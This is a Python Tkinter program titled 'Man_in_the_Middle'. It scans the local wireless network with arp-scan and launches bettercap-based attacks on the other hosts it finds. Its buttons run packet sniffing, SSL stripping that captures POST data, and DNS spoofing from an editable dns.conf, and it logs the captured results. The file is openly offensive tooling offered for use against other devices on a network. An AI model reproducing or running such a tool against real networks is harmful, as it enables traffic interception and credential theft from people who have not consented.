import tkinter as tk
from tkinter import *
import os
import re
import subprocess
from subprocess import call
import psutil

def Widget_Eraser(list_of_widgets):
    i = 0

    while (i < len(list_of_widgets)):
    
        
        list_of_widgets[i].destroy()
        i = i + 1
        
    list_of_widgets.clear()
    
def Back_Button_Recreator(list_of_widgets):

    Button_for_Returning = Button(my_w, text="Back", command=lambda: Rescan_IP_Button(list_of_widgets))
    Button_for_Returning.place(x=390, y=2)
    list_of_widgets.append(Button_for_Returning)

def IP_Button(list_of_widgets):

    Widget_Eraser(list_of_widgets)
   
    output = subprocess.check_output("arp-scan --interface=wlan0 --localnet", shell = True)
    
    var= str(output) 
        
    matches = re.findall( r'[0-9]+(?:\.[0-9]+){3}', var)
    
    Scanned_IPs = []
    
    [Scanned_IPs.append(x) for x in matches if x not in Scanned_IPs]
    
    Button_to_Scan_IPs_on_Network = Button(my_w, text="Rescan_Network_IPs", command=lambda: Rescan_IP_Button(list_of_widgets))
    Button_to_Scan_IPs_on_Network.place(x=350, y=100)
    
    Attacks = Button(my_w, text="Proceed to the attacks", command=lambda: Attack_Choice(list_of_widgets, Scanned_IPs))

    Attacks.place(x=344, y=140)
    
    Logs = Button(my_w, text="View Logs of Attacks", command=lambda: Viewing(list_of_widgets))
    
    Logs.place(x = 348, y =185)
    
    string_variable = tk.StringVar(my_w, "Your IP address is : "+ str(Scanned_IPs[0]))
    
    string_variable2 = tk.StringVar(my_w, "Other IPs found on the network : "+ str(Scanned_IPs[1:]))
    
    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=315, y=40)
    
    l2 = tk.Label(my_w,  textvariable=string_variable2)
    l2.place(x=5, y=250)
    
    os.system("arp-scan --interface=wlan0 --localnet")
   
    list_of_widgets.append(Button_to_Scan_IPs_on_Network)
    list_of_widgets.append(Attacks)
    list_of_widgets.append(Logs)
    list_of_widgets.append(l1)
    list_of_widgets.append(l2)
    
    
def Rescan_IP_Button(list_of_widgets):
    
    with open("output.txt", "w") as firstfile:
        pass
    
    Widget_Eraser(list_of_widgets)
    
    output = subprocess.check_output("arp-scan --interface=wlan0 --localnet", shell = True)
    
    var= str(output) 
        
    matches = re.findall( r'[0-9]+(?:\.[0-9]+){3}', var)
    
    Scanned_IPs = []
    
    [Scanned_IPs.append(x) for x in matches if x not in Scanned_IPs]
    
    string_variable = tk.StringVar(my_w, "Your IP address is : "+ str(Scanned_IPs[0]))
   
    string_variable2 = tk.StringVar(my_w, "Other IPs found on the network after rescan: "+ str(Scanned_IPs[1:]))
    
    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=315, y=40)
    
    l2 = tk.Label(my_w,  textvariable=string_variable2)
    l2.place(x=5, y=250)
    
    Button_to_Scan_IPs_on_Network = Button(my_w, text="Rescan_Network_IPs", command=lambda: Rescan_IP_Button(list_of_widgets))

    Button_to_Scan_IPs_on_Network.place(x=350, y=100)
    
    Attacks = Button(my_w, text="Proceed to the attacks", command=lambda: Attack_Choice(list_of_widgets, Scanned_IPs))

    Attacks.place(x=344, y=140)
    
    Logs = Button(my_w, text="View Logs of Attacks", command=lambda: Viewing(list_of_widgets))
    
    Logs.place(x = 348, y =185)
    
    list_of_widgets.append(Button_to_Scan_IPs_on_Network)
    list_of_widgets.append(Logs)
    list_of_widgets.append(Attacks)
    list_of_widgets.append(l1)
    list_of_widgets.append(l2)
   
def Attack_Choice(list_of_widgets, Scanned_IPs):


    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
    
    string_variable = tk.StringVar(my_w, "Select course of action")

    
    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=345, y=40)
    
    
    Button_for_Sniffing = Button(my_w, text="Sniffing", command=lambda: Sniffing(list_of_widgets, Scanned_IPs))

    Button_for_Sniffing.place(x=382, y=100)
    
    Button_for_SSL_Striping = Button(my_w, text="SSL_Stripping", command=lambda: SSL_Striping(list_of_widgets, Scanned_IPs))

    Button_for_SSL_Striping.place(x=365, y=140)
   
    Button_for_DNS = Button(my_w, text="DNS", command=lambda: DNS_Attack(list_of_widgets, Scanned_IPs))

    Button_for_DNS.place(x=395, y=180)
    
    list_of_widgets.append(Button_for_Sniffing)
    list_of_widgets.append(Button_for_SSL_Striping)
    list_of_widgets.append(Button_for_DNS)
    list_of_widgets.append(l1)
    
    
def Sniffing(list_of_widgets, Scanned_IPs):

    Sniffing_String = "bettercap -X"

    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
    
    string_variable = tk.StringVar(my_w, "Press 'Scan' to start attack on other network IPs.")
    
    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=265, y=35)
    
    Button_for_Starting_Process = Button(my_w, text="Scan", command= lambda: start_function(list_of_widgets, Sniffing_String))
    Button_for_Starting_Process.place(x=390, y=140)
    
    list_of_widgets.append(l1)
    list_of_widgets.append(Button_for_Starting_Process)
    

def SSL_Striping(list_of_widgets, Scanned_IPs):

    SSL_Strip_String = "bettercap --proxy -P POST"

    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
    
    string_variable = tk.StringVar(my_w, "Press 'Scan' to start attack on other network IPs.")

    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=265, y=35)
    
    Button_for_Starting_Process = Button(my_w, text="Scan", command= lambda: start_function(list_of_widgets, SSL_Strip_String))
    Button_for_Starting_Process.place(x=390, y=140)
    
    
    list_of_widgets.append(l1)
    list_of_widgets.append(Button_for_Starting_Process)

def DNS_Attack(list_of_widgets, Scanned_IPs):

    DNS_Attack_String = "bettercap -X --dns dns.conf"

    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
    
    Button_for_Starting_Process = Button(my_w, text="Save", command= lambda: Saving_to_Conf(text_area))
    Button_for_Starting_Process.place(x=500, y=65)
    
    
    Scan_Button = Button(my_w, text="Scan", command= lambda: start_function(list_of_widgets, DNS_Attack_String))
    Scan_Button.place(x=300, y=65)
    
    string_variable = tk.StringVar(my_w, "Modify dns.conf below to satisfaction and press 'Scan' to begin attack on other IPs.")

    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=130, y=35)
    
    text_area= Text(my_w)

    text_area.place(x=5, y=100, height = 1000, width = 795)
    
    tf = open("dns.conf")
    data = tf.read()
    text_area.insert(END, data)
    tf.close()
    
    
    list_of_widgets.append(l1)
    list_of_widgets.append(text_area)
    list_of_widgets.append(Scan_Button)
    list_of_widgets.append(Button_for_Starting_Process)
    

def Saving_to_Conf(text_area):
    print("dgdas")
    tf = open("dns.conf", "w")
    
    tf.write(text_area.get(1.0, END))
    tf.close()
    

def start_function(list_of_widgets, Passed_String):

    
    Passed_String = Passed_String + " --log-timestamp --log output.txt"
    
    Widget_Eraser(list_of_widgets)
    
    
    p   = subprocess.Popen(["python3","attack_launcher.py", Passed_String])
    
    
    Button_for_Interruption = Button(my_w, text="Stop Scan", command=lambda: stop_function(list_of_widgets, p))

    Button_for_Interruption.place(x=380, y=140)
    
    list_of_widgets.append(Button_for_Interruption)

 
def stop_function(list_of_widgets,p):

    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
   
    try: 
    
        p.wait(timeout = 3)
        
    except subprocess.TimeoutExpired:
       kill(p.pid, p)
    

    print("Stopped")
    
    Transferring_Log_Records()
   
    Button_for_Show = Button(my_w, text="Show Results", command=lambda: show_function(list_of_widgets))

    Button_for_Show.place(x=380, y=140)
    
    list_of_widgets.append(Button_for_Show)

def kill(p_id, p):

    process = psutil.Process(p_id)
    for p in process.children(recursive = True):
        p.kill()
    process.kill()
   
def show_function(list_of_widgets):

    Widget_Eraser(list_of_widgets)
    
    Back_Button_Recreator(list_of_widgets)
    
    text_area= Text(my_w)

    text_area.place(x=5, y=100, height = 1000, width = 795)
    
    tf = open("output.txt")
    data = tf.read()
    text_area.insert(END, data)
    tf.close()
    
    list_of_widgets.append(text_area)

def Transferring_Log_Records():
    with open("output.txt", "r") as firstfile, open("superlog.txt", "a") as secondfile:
        
        for line in firstfile:
        
            secondfile.write(line)


def Viewing(list_of_widgets):

    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
    
    text_area= Text(my_w)
    text_area.place(x=5, y=100, height = 1000, width = 795)
    list_of_widgets.append(text_area)
   
   
    tf = open("superlog.txt")
    data = tf.read()
    text_area.insert(END, data)
    tf.close()
   
my_w = tk.Tk()
my_w.geometry("800x800")  
my_w.title("Man_in_the_Middle")  


list_of_widgets = []

Button_to_Scan_IPs_on_Network = Button(my_w, text="Scan_Network_IPs", command=lambda: IP_Button(list_of_widgets))

Button_to_Scan_IPs_on_Network.place(x=350, y=100)


list_of_widgets.append(Button_to_Scan_IPs_on_Network)
        
my_w.mainloop()  
